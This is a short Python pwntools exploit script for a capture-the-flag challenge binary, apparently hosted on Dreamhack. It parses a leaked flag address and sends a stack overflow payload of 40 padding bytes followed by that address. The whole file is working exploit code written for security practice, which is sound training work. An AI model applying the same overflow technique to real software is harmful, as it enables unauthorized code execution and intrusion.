#!/usr/bin/python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host8.dreamhack.games', 24417)
else:
    p = process([exe.path])
# GDB()
p.recvuntil(b'address): ')
flag_address = int(p.recvline()[:-1], 16)
print(hex(flag_address))
payload = b'A' * 40
payload += p64(flag_address)
payload += p64(flag_address)
payload += p32(0x0)
sla(b'input: ', payload)





p.interactive()

